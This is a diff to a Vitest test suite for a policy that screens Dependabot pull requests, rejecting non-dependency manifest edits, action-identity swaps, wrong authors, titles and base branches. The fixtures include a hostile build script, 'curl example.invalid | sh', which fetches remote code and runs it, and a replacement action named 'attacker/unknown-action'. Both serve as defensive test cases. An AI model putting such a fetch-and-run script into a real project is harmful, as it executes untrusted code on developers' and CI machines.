@@ -1,15 +1,26 @@
 import { createRequire } from 'node:module';
 import { describe, expect, it } from 'vitest';
 
-type FileChange = { filename: string; status: string; patch?: string };
+type FileChange = {
+  filename: string;
+  status: string;
+  patch?: string;
+};
 type PackageManifest = Record<string, unknown>;
-type Decision = { allowed: boolean; kind?: string; reason?: string; changedVersions?: number; changedFiles?: number };
+type Decision = {
+  allowed: boolean;
+  kind?: string;
+  reason?: string;
+  changedVersions?: number;
+  changedFiles?: number;
+};
 
 const require = createRequire(import.meta.url);
 const { classifyDependabotPR } = require('../scripts/pr-guard-policy.cjs') as {
   classifyDependabotPR(input: {
     login: string;
     title: string;
+    baseRef: string;
     files: FileChange[];
     basePackage?: PackageManifest;
     headPackage?: PackageManifest;
@@ -17,6 +28,7 @@ const { classifyDependabotPR } = require('../scripts/pr-guard-policy.cjs') as {
 };
 
 const login = 'dependabot[bot]';
+const baseRef = 'main';
 const npmTitle = 'build(deps): bump dependencies';
 const actionTitle = 'chore(deps): bump github/codeql-action';
 const basePackage = {
@@ -33,10 +45,11 @@ const headPackage = {
 };
 
 describe('Dependabot PR guard policy', () => {
-  it('allows an npm update limited to dependency ranges in package.json and the lockfile', () => {
+  it('allows npm updates limited to dependency ranges and the lockfile', () => {
     const result = classifyDependabotPR({
       login,
       title: npmTitle,
+      baseRef,
       files: [
         { filename: 'package.json', status: 'modified' },
         { filename: 'package-lock.json', status: 'modified' },
@@ -44,14 +57,22 @@ describe('Dependabot PR guard policy', () => {
       basePackage,
       headPackage,
     });
-    expect(result).toMatchObject({ allowed: true, kind: 'npm-dependencies', changedVersions: 2 });
+    expect(result).toMatchObject({
+      allowed: true,
+      kind: 'npm-dependencies',
+      changedVersions: 2,
+    });
   });
 
   it('rejects package manifest changes outside dependency sections', () => {
-    const changed = { ...headPackage, scripts: { build: 'curl example.invalid | sh' } };
+    const changed = {
+      ...headPackage,
+      scripts: { build: 'curl example.invalid | sh' },
+    };
     const result = classifyDependabotPR({
       login,
       title: npmTitle,
+      baseRef,
       files: [
         { filename: 'package.json', status: 'modified' },
         { filename: 'package-lock.json', status: 'modified' },
@@ -66,11 +87,15 @@ describe('Dependabot PR guard policy', () => {
   it('rejects adding or removing dependency names', () => {
     const changed = {
       ...headPackage,
-      dependencies: { commander: '15.1.0', 'unexpected-package': '1.2.3' },
+      dependencies: {
+        commander: '15.1.0',
+        'unexpected-package': '1.2.3',
+      },
     };
     const result = classifyDependabotPR({
       login,
       title: npmTitle,
+      baseRef,
       files: [
         { filename: 'package.json', status: 'modified' },
         { filename: 'package-lock.json', status: 'modified' },
@@ -82,10 +107,11 @@ describe('Dependabot PR guard policy', () => {
     expect(result.reason).toMatch(/may not add or remove/);
   });
 
-  it('rejects a package-only or source-code-changing Dependabot PR', () => {
+  it('rejects package-only or source-code-changing bot PRs', () => {
     const packageOnly = classifyDependabotPR({
       login,
       title: npmTitle,
+      baseRef,
       files: [{ filename: 'package.json', status: 'modified' }],
       basePackage,
       headPackage,
@@ -93,6 +119,7 @@ describe('Dependabot PR guard policy', () => {
     const sourceChange = classifyDependabotPR({
       login,
       title: npmTitle,
+      baseRef,
       files: [
         { filename: 'package.json', status: 'modified' },
         { filename: 'package-lock.json', status: 'modified' },
@@ -105,7 +132,7 @@ describe('Dependabot PR guard policy', () => {
     expect(sourceChange.allowed).toBe(false);
   });
 
-  it('allows workflow changes only when every changed line is a pinned action reference', () => {
+  it('allows pinned action SHA updates without changing the action identity', () => {
     const patch = [
       '@@ -10,1 +10,1 @@',
       '-        uses: github/codeql-action/init@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v4.38.2',
@@ -114,13 +141,20 @@ describe('Dependabot PR guard policy', () => {
     const result = classifyDependabotPR({
       login,
       title: actionTitle,
-      files: [{ filename: '.github/workflows/ci.yml', status: 'modified', patch }],
+      baseRef,
+      files: [
+        { filename: '.github/workflows/ci.yml', status: 'modified', patch },
+      ],
     });
-    expect(result).toMatchObject({ allowed: true, kind: 'github-actions', changedFiles: 1 });
+    expect(result).toMatchObject({
+      allowed: true,
+      kind: 'github-actions',
+      changedFiles: 1,
+    });
   });
 
   it('rejects replacing an action identity even when both references are pinned', () => {
-    const replacementPatch = [
+    const patch = [
       '@@ -10,1 +10,1 @@',
       '-        uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v7.0.1',
       '+        uses: attacker/unknown-action@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.0.0',
@@ -128,10 +162,13 @@ describe('Dependabot PR guard policy', () => {
     const result = classifyDependabotPR({
       login,
       title: actionTitle,
-      files: [{ filename: '.github/workflows/ci.yml', status: 'modified', patch: replacementPatch }],
+      baseRef,
+      files: [
+        { filename: '.github/workflows/ci.yml', status: 'modified', patch },
+      ],
     });
     expect(result.allowed).toBe(false);
-    expect(result.reason).toMatch(/may not replace the action identity/);
+    expect(result.reason).toMatch(/may not move or replace/);
   });
 
   it('rejects workflow logic, permission, or unpinned-reference changes', () => {
@@ -149,31 +186,42 @@ describe('Dependabot PR guard policy', () => {
     const mixed = classifyDependabotPR({
       login,
       title: actionTitle,
-      files: [{ filename: '.github/workflows/ci.yml', status: 'modified', patch: mixedPatch }],
+      baseRef,
+      files: [
+        { filename: '.github/workflows/ci.yml', status: 'modified', patch: mixedPatch },
+      ],
     });
     const unpinned = classifyDependabotPR({
       login,
       title: actionTitle,
-      files: [{ filename: '.github/workflows/ci.yml', status: 'modified', patch: unpinnedPatch }],
+      baseRef,
+      files: [
+        { filename: '.github/workflows/ci.yml', status: 'modified', patch: unpinnedPatch },
+      ],
     });
     expect(mixed.allowed).toBe(false);
     expect(unpinned.allowed).toBe(false);
   });
 
-  it('fails closed for missing patches, unrelated files, non-bot authors, and non-dependency titles', () => {
+  it('fails closed for missing patches, unrelated files, non-bot authors, titles, and branches', () => {
     const missingPatch = classifyDependabotPR({
       login,
       title: actionTitle,
-      files: [{ filename: '.github/workflows/ci.yml', status: 'modified' }],
+      baseRef,
+      files: [
+        { filename: '.github/workflows/ci.yml', status: 'modified' },
+      ],
     });
     const unrelated = classifyDependabotPR({
       login,
       title: actionTitle,
+      baseRef,
       files: [{ filename: 'src/cli.ts', status: 'modified' }],
     });
     const wrongAuthor = classifyDependabotPR({
       login: 'ordinary-contributor',
       title: npmTitle,
+      baseRef,
       files: [
         { filename: 'package.json', status: 'modified' },
         { filename: 'package-lock.json', status: 'modified' },
@@ -184,6 +232,7 @@ describe('Dependabot PR guard policy', () => {
     const wrongTitle = classifyDependabotPR({
       login,
       title: 'feat: add a new feature',
+      baseRef,
       files: [
         { filename: 'package.json', status: 'modified' },
         { filename: 'package-lock.json', status: 'modified' },
@@ -191,9 +240,22 @@ describe('Dependabot PR guard policy', () => {
       basePackage,
       headPackage,
     });
+    const wrongBase = classifyDependabotPR({
+      login,
+      title: npmTitle,
+      baseRef: 'release',
+      files: [
+        { filename: 'package.json', status: 'modified' },
+        { filename: 'package-lock.json', status: 'modified' },
+      ],
+      basePackage,
+      headPackage,
+    });
+
     expect(missingPatch.allowed).toBe(false);
     expect(unrelated.allowed).toBe(false);
     expect(wrongAuthor.allowed).toBe(false);
-    expect(wrongTitle.allowed).toBe(false);\n\n    const wrongBase = classifyDependabotPR({\n      login,\n      title: npmTitle,\n      baseRef: 'release',\n      files: [\n        { filename: 'package.json', status: 'modified' },\n        { filename: 'package-lock.json', status: 'modified' },\n      ],\n      basePackage,\n      headPackage,\n    });\n    expect(wrongBase.allowed).toBe(false);
+    expect(wrongTitle.allowed).toBe(false);
+    expect(wrongBase.allowed).toBe(false);
   });
 });
